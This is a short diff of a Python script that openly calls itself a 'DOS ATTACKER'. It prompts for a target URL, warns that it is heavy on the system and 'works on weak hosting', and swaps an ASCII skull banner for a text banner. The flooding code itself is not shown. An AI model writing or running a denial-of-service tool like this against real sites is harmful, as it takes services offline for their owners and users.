@@ -1,24 +1,7 @@
 import threading
 import requests
 
-icon = """
-███████████████████████████████████
-███████████▀▀▀░░░░░░░▀▀▀███████████
-████████▀░░░░░░░░░░░░░░░░░▀████████ 
-███████│░░░░░░░░░░░░░░░░░░░│███████ 
-███████░│▐███▀▀░░▄░░▀▀███▌│░███████ 
-██████▀─┘░░░░░░░▐█▌░░░░░░░└─▀██████ 
-██████▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄██████ 
-████████▄─┘██▌░░░░░░░▐██└─▄████████ 
-█████████░░▐█─┬┬┬┬┬┬┬─█▌░░█████████ 
-████████▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐████████ 
-█████████▄░░░└┴┴┴┴┴┴┴┘░░░▄█████████ 
-███████████▄░░░░░░░░░░░▄███████████ 
-██████████████▄▄▄▄▄▄▄██████████████ """
-
-print(icon)
-
-print("quit - exit of the app\n[!] WARNING: This loads the system very much.\nIt works on weak hosting\n")
+print("YOU LAUNCH DOS ATTACKER BY SCREAMHACK\nquit - exit of the app\n[!] WARNING: This loads the system very much.\nIt works on weak hosting\n")
 url = input("enter URL: ")
 
 if url == "quit":
